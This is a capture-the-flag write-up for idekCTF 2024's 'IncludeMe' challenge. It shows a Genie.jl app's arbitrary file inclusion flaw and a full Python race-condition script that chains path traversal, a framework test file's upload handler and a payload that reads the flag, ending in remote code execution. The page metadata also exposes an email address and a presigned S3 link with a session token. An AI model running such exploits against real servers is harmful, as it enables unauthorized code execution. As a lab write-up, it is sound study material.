---
id: 476adce3-c249-4a2d-ad88-ea823a5c99a1
title: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
created_time: 2024-08-19T00:24:00.000Z
last_edited_time: 2024-09-28T00:27:00.000Z
cover_image: ./imgs/images_CYPDSAFZ
icon_emoji: 🏎️
categories: []
verification:
  state: unverified
  verified_by: null
  date: null
page: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/images_CYPDSAFZ

---

In idekCTF 2024, I played with the **P1G SEKAI** team and secured 1st place out of 1,068 teams! I solved a challenge named "Included me" and got the first blood on that challenge.

# Challenge Description

another minimalist, frontend-less, challenge because i'm bad at writing server-side challenges

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/709a0b78-7ae2-4171-930b-e98c753c8621/includeme.tar.gz?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466Z33C4JKJ%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T123139Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDQaCXVzLXdlc3QtMiJGMEQCIGw5W0KTRIu5QSSH9nDCqERndvSVYNqVvInPl2LNb%2B8OAiAwnLM22q0%2F19WeT0CvEp1ecdtulcC56VJFjBQsaRnjqyqIBAjt%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM7ZDvdVPzJ5iEF2z2KtwDRzZjKpYA9092ijcEJBjteJ%2FyKynKs85MvWi026o28ibH2hRJDd55Iq69QT%2BKrQTzwKiTN0oPGSolFe8w8uCokiZ6NFBSWZg4VD2uQt2iJL%2Fek4H5qEnhSFxQgWGIwSw6rU%2F8zWheWpCBM%2FHmTZ9Gwr3Ps1%2Bj8AuNHJENJkuGtJsNmXX5sMDwbM24qakZdcDdSS7Gf1GMOFBwBrXJQo%2B2svZ9PjedGzZdj4tr%2F5rZQXC%2B0DbKikdbpOazfvFpAVowdsDY9TvTeo4fbxRR3i6ymob7gpblq91EzVTmxUuMOvRewPQAWCll4IQs7sg3svJ3g3dPJBgD%2BZTmO96aqC8FoISKjhJQBMJ0IcWXKrN%2BB2t4SQVlCOpaz8OIWdGv8LQqiSrk97QTythkYgERJEIAImSbwiHujNNvmy2ZtahD7HZPZR7aNOEBjkax7%2BnAu5VW8TQvhEKaD4Aa%2B82kd4TAQTuUIZZZpnpaNcg90IvkukoettPBc7clq%2B3uu%2Fp0Ty5fQza7gtekJAbEo6SliE4P42Il0Nu%2BAR2fyS%2Fx7f3YWROXlaj1wLu1safiJwtV4gnx1NVwrQQht4XTWWiiTXkg6i61mglunv1n4rDipE3UPVXzWcygHMQ6pD83xmIwhL%2FBwQY6pgEGaVmStGc1I2z9VIdPzcqFRMBfjwpZgC9jXIoN6QbZnuIgJCS3axh9NVJlWsUDNAJqKd0ygfbvPkyuMpMycqUm72RvjIDsUdbChuAxpBwmgYXtn7pLLa7kulUcvuoD1ijhve6g5YlpaObHMhaYEQcD0zYqG%2FFTqqQIhmSxPmQe9ESCc7WidfFGsqDZJu2t7VDcvbxsU5icXR1Wi0eQXfm32cUuNE5Y\&X-Amz-Signature=1f03b1959479ff1be3e08f34cf8848c29bf602426eefe7ae509340a34497b5fd\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# How to Solve

The goal of this challenge was to achieve Remote Code Execution (RCE) and capture the flag. The program was vulnerable to arbitrary file inclusion here:

```julia
using Genie, Genie.Requests, Pkg

Pkg.activate(".")

index() = include(params(:page, "example.jl"))

route("/", index)

up(1337, "0.0.0.0", async = false)
```

We could include arbitrary files into the application, altering its flow. I discovered that we could include a test case from this Genie.jl repository:

> [![image](./imgs/b322ed80-bc5a-11e9-807a-9b53749c40ef_ftYlQyUC) **Genie.jl/test/fileuploads/test.jl at 509886d61a75d74bcbd45db1f77230abd4cd11a8 · GenieFramework/Genie.jl**](https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14)\
> 🧞The highly productive Julia web framework. Contribute to GenieFramework/Genie.jl development by creating an account on GitHub.\
> <https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14>

This test case essentially exposes a file upload vulnerability, allowing us to upload arbitrary files into Genie. However, after including that file, the program’s flow would change, preventing us from doing it a second time… or would it? The solution is yes, we can include it again if we’re fast enough to include `app.jl` right after uploading the file. This requires a race condition. Here's my solution script:

```python
import httpx
import asyncio

URL = "http://localhost:1337"
# URL = "https://includeme-295e03fffda9795f.instancer.idek.team/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url, timeout=100)
    def page(self, page):
        return self.c.get("/", params={"page": page})
    def upload(self, fileupload):
        return self.c.post("/", files={"fileupload": ("x.jl", fileupload)})
class API(BaseAPI):
    ...

async def main():
    api = API()
    ress = []
    res1 = api.page("../home/ctf/.julia/packages/Genie/yQwwj/test/fileuploads/test.jl")
    ress.append(res1)
    for i in range(10):
        res2 = api.upload("""
read(`cat flag.txt`, String)
""")
        for j in range(10):
            res3 = api.page("app.jl")
            ress.append(res3)
        ress.extend([res1, res2])
    ress = await asyncio.gather(*ress)
    for res in ress:
        print(res.text)


if __name__ == "__main__":
    asyncio.run(main())

```

Next, visit <http://localhost:1337/?page=x.jl> to retrieve the flag.

![](./imgs/image_2FRbeU5K.png)
